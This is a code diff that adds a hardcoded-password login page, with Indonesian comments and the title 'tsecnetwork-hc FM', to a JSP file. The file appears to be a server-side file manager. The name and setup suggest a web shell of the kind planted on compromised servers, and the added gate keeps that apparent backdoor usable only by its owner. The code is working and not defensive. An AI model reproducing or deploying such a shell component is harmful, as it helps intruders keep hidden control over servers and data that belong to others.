@@ -761,6 +761,58 @@
 	//---------------------------------------------------------------------------------------------------------------
 
 	%>
+	
+<%-- ========== AWAL LOGIN ========== --%>
+<%
+    String password = "tsecnetwork1337";
+    String entered = request.getParameter("password");
+    if (entered != null && entered.equals(password)) {
+        // Hapus attribute lama jika ada (untuk menghindari tipe data salah)
+        session.removeAttribute("logged");
+        // Simpan sebagai Boolean (bukan String)
+        session.setAttribute("logged", Boolean.TRUE);
+        response.sendRedirect(request.getRequestURI());
+        return;
+    }
+    // Cek session login dengan aman
+    Object loggedObj = session.getAttribute("logged");
+    boolean logged = false;
+    if (loggedObj instanceof Boolean) {
+        logged = ((Boolean) loggedObj).booleanValue();
+    } else if (loggedObj instanceof String) {
+        // Jika masih String (dari session lama), konversi dan perbaiki
+        logged = "true".equalsIgnoreCase((String) loggedObj);
+        session.setAttribute("logged", logged);
+    }
+    if (!logged) {
+        // Tampilkan form login
+%>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login - tsecnetwork-hc FM</title>
+    <style>
+        body { font-family: Verdana, Arial, sans-serif; font-size: 12pt; text-align: center; margin-top: 50px; }
+        form { margin-top: 20px; }
+        input[type="password"] { padding: 5px; width: 200px; }
+        input[type="submit"] { padding: 5px 20px; }
+        h1 { color: #333; }
+    </style>
+</head>
+<body>
+    <h1>Selamat datang di tsecnetwork-hc FM</h1>
+    <form method="post">
+        <label>Password: <input type="password" name="password" required></label>
+        <input type="submit" value="Login">
+    </form>
+</body>
+</html>
+<%
+        return;
+    }
+%>
+<%-- ========== AKHIR LOGIN ========== --%>
+
 <%
 		//Get the current browsing directory
 		request.setAttribute("dir", request.getParameter("dir"));
